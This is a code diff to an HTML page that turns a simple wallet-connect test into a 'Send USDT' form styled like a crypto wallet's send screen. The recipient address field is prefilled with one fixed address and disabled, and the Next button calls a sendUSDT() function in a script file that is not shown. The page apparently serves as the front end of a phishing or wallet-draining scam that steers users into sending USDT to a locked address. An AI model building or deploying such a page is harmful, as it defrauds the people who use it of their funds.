@@ -1,31 +1,33 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Test</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send USDT</title>
+  <link rel="stylesheet" href="style.css">
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
 </head>
 <body>
-  <button onclick="connectWallet()">Next</button>
+  <div class="container">
+    <label for="address">Address or Domain Name</label>
+    <div class="input-wrapper">
+      <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" disabled />
+      <span onclick="clearAddress()">✕</span>
+      <span onclick="pasteAddress()">Paste</span>
+    </div>
 
-  <script>
-    async function connectWallet() {
-      alert("Clicked!");
+    <label for="amount">Amount</label>
+    <div class="amount-wrapper">
+      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateFiat()"/>
+      <span>USDT</span>
+      <span onclick="fillMax()">Max</span>
+    </div>
 
-      if (!window.ethereum) {
-        alert("No wallet");
-        return;
-      }
+    <div class="amount-line" id="fiat">≈ $0.00</div>
 
-      try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = provider.getSigner();
-        const address = await signer.getAddress();
-        alert("Connected: " + address);
-      } catch (err) {
-        alert("Error: " + err.message);
-      }
-    }
-  </script>
+    <button onclick="sendUSDT()">Next</button>
+  </div>
+
+  <script src="script.js"></script>
 </body>
 </html>
